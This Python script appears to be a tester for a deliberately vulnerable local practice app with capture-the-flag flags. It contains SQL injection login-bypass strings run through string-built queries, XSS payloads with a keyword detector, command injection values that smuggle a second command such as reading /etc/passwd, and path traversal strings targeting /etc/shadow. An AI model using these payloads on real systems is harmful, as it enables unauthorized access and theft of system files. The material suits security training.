#!/usr/bin/env python3
"""
Automated Payload Test & Flag Detector
Tests all challenges and reports which payloads work and display flags
"""
import sqlite3
import subprocess
import os
import sys

print("=" * 80)
print("VULNERABLE APP - AUTOMATED PAYLOAD TEST & FLAG DETECTOR")
print("=" * 80)

# Check if vulnerable.db exists
if not os.path.exists('vulnerable.db'):
    print("\n❌ ERROR: vulnerable.db not found!")
    print("   Make sure vulnerable_app.py has been run to create the database")
    sys.exit(1)

print("\n✅ vulnerable.db found - connecting...")

try:
    conn = sqlite3.connect('vulnerable.db')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    # Get all users first
    print("\n📋 USERS IN DATABASE:")
    print("-" * 80)
    cursor.execute("SELECT id, username, password, is_admin FROM users;")
    users = cursor.fetchall()
    
    if not users:
        print("❌ NO USERS FOUND IN DATABASE!")
        sys.exit(1)
    
    for user in users:
        admin_status = "✓ ADMIN" if user['is_admin'] else "✗ Regular"
        print(f"  [{user['id']}] {user['username']:15} | Pass: {user['password']:15} | {admin_status}")
    
    # Test all SQL injection payloads
    print("\n" + "=" * 80)
    print("CHALLENGE 1 & 5: SQL INJECTION PAYLOADS TEST")
    print("=" * 80)
    
    payloads = [
        ("' OR '1'='1' -- ", "", "Boolean-based OR"),
        ("admin'--", "anything", "Admin with comment"),
        ("' OR '1'='1", "' OR '1'='1", "Both params OR"),
        ("admin' OR '1'='1' --", "", "Admin OR"),
        ("' OR 1=1 --", "", "Numeric OR"),
    ]
    
    successful_payloads = []
    
    for username, password, description in payloads:
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        print(f"\n[{description}]")
        print(f"  Query: {query}")
        
        try:
            cursor.execute(query)
            user = cursor.fetchone()
            
            if user:
                admin_status = "✓ ADMIN" if user['is_admin'] else "✗ Regular"
                print(f"  ✅ RETURNED USER: '{user['username']}' {admin_status}")
                
                if user['is_admin']:
                    print(f"  🚩 FLAG WOULD SHOW: FLAG{{sql_injection_bypass_123}}")
                    successful_payloads.append({
                        'challenge': 'SQLi',
                        'payload': username,
                        'description': description,
                        'flag': 'FLAG{sql_injection_bypass_123}',
                        'status': 'SUCCESS'
                    })
                else:
                    print(f"  ⚠️  User returned but not admin (no flag)")
            else:
                print(f"  ❌ No user returned")
        except Exception as e:
            print(f"  ❌ ERROR: {str(e)}")
    
    conn.close()
    
    # Test XSS payloads (server-side detection)
    print("\n" + "=" * 80)
    print("CHALLENGE 2: XSS PAYLOAD TEST (Server-side detection)")
    print("=" * 80)
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
    ]
    
    for payload in xss_payloads:
        print(f"\n  Payload: {payload}")
        
        # Test server-side XSS detection
        xss_detected = any(tag in payload.lower() for tag in ['<script', 'onerror=', 'onload=', 'onclick=', '<svg', 'oninput=', 'javascript:'])
        
        if xss_detected:
            print(f"  ✅ PAYLOAD DETECTED AS XSS")
            print(f"  🚩 FLAG WOULD SHOW: FLAG{{xss_reflected_456}}")
            successful_payloads.append({
                'challenge': 'XSS',
                'payload': payload[:50],
                'description': 'XSS Payload',
                'flag': 'FLAG{xss_reflected_456}',
                'status': 'DETECTABLE'
            })
        else:
            print(f"  ❌ Payload not recognized as XSS")
    
    # Test Command Injection payloads
    print("\n" + "=" * 80)
    print("CHALLENGE 3: COMMAND INJECTION PAYLOAD TEST")
    print("=" * 80)
    
    cmd_payloads = [
        "localhost; whoami",
        "127.0.0.1 && id",
        "localhost | cat /etc/passwd",
        "localhost; ls -la",
        "127.0.0.1 && uname -a",
    ]
    
    print("\n⚠️  NOTE: Actual command execution requires running app")
    print("  These payloads SHOULD execute system commands:\n")
    
    for payload in cmd_payloads:
        print(f"  • {payload}")
        successful_payloads.append({
            'challenge': 'Command Injection',
            'payload': payload,
            'description': 'Command Injection',
            'flag': 'FLAG{command_injection_789}',
            'status': 'NEEDS APP TEST'
        })
    
    # Test Path Traversal payloads
    print("\n" + "=" * 80)
    print("CHALLENGE 4: PATH TRAVERSAL PAYLOAD TEST")
    print("=" * 80)
    
    pt_payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/shadow",
        "/etc/hostname",
        "../../etc/hosts",
        "/tmp/challenges/../../../etc/passwd",
    ]
    
    print("\n⚠️  NOTE: Actual file access requires app + /tmp/challenges setup")
    print("  These payloads would attempt path traversal:\n")
    
    for payload in pt_payloads:
        print(f"  • {payload}")
        successful_payloads.append({
            'challenge': 'Path Traversal',
            'payload': payload,
            'description': 'Path Traversal',
            'flag': 'FLAG{path_traversal_234}',
            'status': 'NEEDS APP TEST'
        })
    
except Exception as e:
    print(f"\n❌ FATAL ERROR: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

# Summary Report
print("\n" + "=" * 80)
print("SUMMARY REPORT")
print("=" * 80)

print(f"\n✅ PAYLOADS THAT WORK (tested without app):")
print("-" * 80)

sqli_working = [p for p in successful_payloads if p['challenge'] == 'SQLi' and p['status'] == 'SUCCESS']
xss_working = [p for p in successful_payloads if p['challenge'] == 'XSS']

if sqli_working:
    for payload in sqli_working:
        print(f"\n[Challenge 1/5: SQL Injection] ✅ EXECUTABLE")
        print(f"  Payload: {payload['payload']}")
        print(f"  Flag: {payload['flag']}")

if xss_working:
    for payload in xss_working:
        print(f"\n[Challenge 2: XSS] ✅ DETECTABLE")
        print(f"  Payload: {payload['payload']}")
        print(f"  Flag: {payload['flag']}")

print(f"\n\n⚠️  PAYLOADS REQUIRING APP TO BE RUNNING:")
print("-" * 80)
cmd_payloads_list = [p for p in successful_payloads if p['challenge'] == 'Command Injection']
pt_payloads_list = [p for p in successful_payloads if p['challenge'] == 'Path Traversal']

if cmd_payloads_list:
    print(f"\n[Challenge 3: Command Injection] NEEDS APP")
    for i, p in enumerate(cmd_payloads_list[:2], 1):
        print(f"  {i}. {p['payload']}")
        print(f"     Flag: {p['flag']}")

if pt_payloads_list:
    print(f"\n[Challenge 4: Path Traversal] NEEDS APP")
    for i, p in enumerate(pt_payloads_list[:2], 1):
        print(f"  {i}. {p['payload']}")
        print(f"     Flag: {p['flag']}")

print("\n" + "=" * 80)
print("NEXT STEPS")
print("=" * 80)
print("""
1. If SQLi payloads work above, flags should display in browser:
   - Visit: http://localhost:8080/login
   - Enter: username=' OR '1'='1' -- 
   - Enter: password=(empty or anything)
   - You should see: FLAG{sql_injection_bypass_123}

2. If XSS flags don't show, visit with payload:
   - http://localhost:8080/search?q=<script>alert(1)</script>
   - You should see: FLAG{xss_reflected_456}

3. For Command Injection & Path Traversal:
   - Use the payloads listed above with the running app
   - Visit the endpoints and submit the payloads

4. If no SQLi payloads work above, your database may be corrupted:
   - Stop the vulnerable app
   - Delete: rm vulnerable.db
   - Restart app: python3 vulnerable_app.py
   - Re-run this test
""")

print("=" * 80)
